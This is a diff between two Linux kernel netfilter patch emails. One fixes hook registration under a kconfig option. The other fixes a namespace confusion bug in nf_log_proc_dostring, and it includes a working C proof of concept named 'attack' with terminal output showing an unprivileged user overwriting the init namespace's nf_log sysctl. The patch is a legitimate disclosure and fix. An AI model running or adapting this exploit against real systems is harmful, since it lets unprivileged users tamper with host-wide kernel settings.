@@ -1,7 +1,7 @@
 From: Pablo Neira Ayuso <pablo@netfilter.org>
-Subject: [PATCH 2/5] netfilter: accommodate different kconfig in nf_set_hooks_head
-Date: Thu,  6 Oct 2016 02:07:46 +0200
-Message-ID: <1475712469-17000-3-git-send-email-pablo@netfilter.org>
+Subject: [PATCH 4/5] netfilter: fix namespace handling in nf_log_proc_dostring
+Date: Thu,  6 Oct 2016 02:07:48 +0200
+Message-ID: <1475712469-17000-5-git-send-email-pablo@netfilter.org>
 References: <1475712469-17000-1-git-send-email-pablo@netfilter.org>
 Cc: davem@davemloft.net, netdev@vger.kernel.org
 To: netfilter-devel@vger.kernel.org
@@ -10,56 +10,137 @@ In-Reply-To: <1475712469-17000-1-git-send-email-pablo@netfilter.org>
 Sender: netfilter-devel-owner@vger.kernel.org
 List-Id: netdev.vger.kernel.org
 
-From: Aaron Conole <aconole@bytheb.org>
+From: Jann Horn <jann@thejh.net>
 
-When CONFIG_NETFILTER_INGRESS is unset (or no), we need to handle
-the request for registration properly by dropping the hook.  This
-releases the entry during the set.
+nf_log_proc_dostring() used current's network namespace instead of the one
+corresponding to the sysctl file the write was performed on. Because the
+permission check happens at open time and the nf_log files in namespaces
+are accessible for the namespace owner, this can be abused by an
+unprivileged user to effectively write to the init namespace's nf_log
+sysctls.
 
-Fixes: e3b37f11e6e4 ("netfilter: replace list_head with single linked list")
-Signed-off-by: Aaron Conole <aconole@bytheb.org>
+Stash the "struct net *" in extra2 - data and extra1 are already used.
+
+Repro code:
+
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <sched.h>
+#include <err.h>
+#include <sys/mount.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+
+char child_stack[1000000];
+
+uid_t outer_uid;
+gid_t outer_gid;
+int stolen_fd = -1;
+
+void writefile(char *path, char *buf) {
+        int fd = open(path, O_WRONLY);
+        if (fd == -1)
+                err(1, "unable to open thing");
+        if (write(fd, buf, strlen(buf)) != strlen(buf))
+                err(1, "unable to write thing");
+        close(fd);
+}
+
+int child_fn(void *p_) {
+        if (mount("proc", "/proc", "proc", MS_NOSUID|MS_NODEV|MS_NOEXEC,
+                  NULL))
+                err(1, "mount");
+
+        /* Yes, we need to set the maps for the net sysctls to recognize us
+         * as namespace root.
+         */
+        char buf[1000];
+        sprintf(buf, "0 %d 1\n", (int)outer_uid);
+        writefile("/proc/1/uid_map", buf);
+        writefile("/proc/1/setgroups", "deny");
+        sprintf(buf, "0 %d 1\n", (int)outer_gid);
+        writefile("/proc/1/gid_map", buf);
+
+        stolen_fd = open("/proc/sys/net/netfilter/nf_log/2", O_WRONLY);
+        if (stolen_fd == -1)
+                err(1, "open nf_log");
+        return 0;
+}
+
+int main(void) {
+        outer_uid = getuid();
+        outer_gid = getgid();
+
+        int child = clone(child_fn, child_stack + sizeof(child_stack),
+                          CLONE_FILES|CLONE_NEWNET|CLONE_NEWNS|CLONE_NEWPID
+                          |CLONE_NEWUSER|CLONE_VM|SIGCHLD, NULL);
+        if (child == -1)
+                err(1, "clone");
+        int status;
+        if (wait(&status) != child)
+                err(1, "wait");
+        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
+                errx(1, "child exit status bad");
+
+        char *data = "NONE";
+        if (write(stolen_fd, data, strlen(data)) != strlen(data))
+                err(1, "write");
+        return 0;
+}
+
+Repro:
+
+$ gcc -Wall -o attack attack.c -std=gnu99
+$ cat /proc/sys/net/netfilter/nf_log/2
+nf_log_ipv4
+$ ./attack
+$ cat /proc/sys/net/netfilter/nf_log/2
+NONE
+
+Because this looks like an issue with very low severity, I'm sending it to
+the public list directly.
+
+Signed-off-by: Jann Horn <jann@thejh.net>
 Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
 ---
- net/netfilter/core.c | 15 +++++++++++----
- 1 file changed, 11 insertions(+), 4 deletions(-)
+ net/netfilter/nf_log.c | 6 ++++--
+ 1 file changed, 4 insertions(+), 2 deletions(-)
 
-diff --git a/net/netfilter/core.c b/net/netfilter/core.c
-index e3f68a786afe..c9d90eb64046 100644
---- a/net/netfilter/core.c
-+++ b/net/netfilter/core.c
-@@ -90,10 +90,12 @@ static void nf_set_hooks_head(struct net *net, const struct nf_hook_ops *reg,
- {
- 	switch (reg->pf) {
- 	case NFPROTO_NETDEV:
-+#ifdef CONFIG_NETFILTER_INGRESS
- 		/* We already checked in nf_register_net_hook() that this is
- 		 * used from ingress.
- 		 */
- 		rcu_assign_pointer(reg->dev->nf_hooks_ingress, entry);
-+#endif
- 		break;
- 	default:
- 		rcu_assign_pointer(net->nf.hooks[reg->pf][reg->hooknum],
-@@ -107,10 +109,15 @@ int nf_register_net_hook(struct net *net, const struct nf_hook_ops *reg)
- 	struct nf_hook_entry *hooks_entry;
- 	struct nf_hook_entry *entry;
+diff --git a/net/netfilter/nf_log.c b/net/netfilter/nf_log.c
+index 30a17d649a83..3dca90dc24ad 100644
+--- a/net/netfilter/nf_log.c
++++ b/net/netfilter/nf_log.c
+@@ -422,7 +422,7 @@ static int nf_log_proc_dostring(struct ctl_table *table, int write,
+ 	char buf[NFLOGGER_NAME_LEN];
+ 	int r = 0;
+ 	int tindex = (unsigned long)table->extra1;
+-	struct net *net = current->nsproxy->net_ns;
++	struct net *net = table->extra2;
  
--	if (reg->pf == NFPROTO_NETDEV &&
--	    (reg->hooknum != NF_NETDEV_INGRESS ||
--	     !reg->dev || dev_net(reg->dev) != net))
--		return -EINVAL;
-+	if (reg->pf == NFPROTO_NETDEV) {
-+#ifndef CONFIG_NETFILTER_INGRESS
-+		if (reg->hooknum == NF_NETDEV_INGRESS)
-+			return -EOPNOTSUPP;
-+#endif
-+		if (reg->hooknum != NF_NETDEV_INGRESS ||
-+		    !reg->dev || dev_net(reg->dev) != net)
-+			return -EINVAL;
-+	}
+ 	if (write) {
+ 		struct ctl_table tmp = *table;
+@@ -476,7 +476,6 @@ static int netfilter_log_sysctl_init(struct net *net)
+ 				 3, "%d", i);
+ 			nf_log_sysctl_table[i].procname	=
+ 				nf_log_sysctl_fnames[i];
+-			nf_log_sysctl_table[i].data = NULL;
+ 			nf_log_sysctl_table[i].maxlen = NFLOGGER_NAME_LEN;
+ 			nf_log_sysctl_table[i].mode = 0644;
+ 			nf_log_sysctl_table[i].proc_handler =
+@@ -486,6 +485,9 @@ static int netfilter_log_sysctl_init(struct net *net)
+ 		}
+ 	}
  
- 	entry = kmalloc(sizeof(*entry), GFP_KERNEL);
- 	if (!entry)
++	for (i = NFPROTO_UNSPEC; i < NFPROTO_NUMPROTO; i++)
++		table[i].extra2 = net;
++
+ 	net->nf.nf_log_dir_header = register_net_sysctl(net,
+ 						"net/netfilter/nf_log",
+ 						table);
 -- 
 2.1.4
 
